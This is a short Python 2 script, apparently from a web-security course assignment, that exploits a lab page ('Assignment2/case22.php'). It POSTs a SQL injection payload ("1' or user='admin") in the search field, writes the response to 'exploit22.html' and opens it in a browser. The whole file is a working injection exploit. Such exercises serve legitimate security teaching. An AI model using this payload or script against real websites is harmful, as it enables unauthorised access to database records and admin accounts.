import urllib, urllib2, cookielib
import os
import webbrowser


# do POST to the form

values = dict(search="1' or user='admin")
data = urllib.urlencode(values)

#submit the form
url = 'http://www.wsb.com/Assignment2/case22.php'
req = urllib2.Request(url, data)
rsp = urllib2.urlopen(req)
#read the return result
content = rsp.read()

temp_html_file = 'exploit22.html'

with open(temp_html_file, 'w') as f:
    f.write(content)
webbrowser.open(temp_html_file, new=2)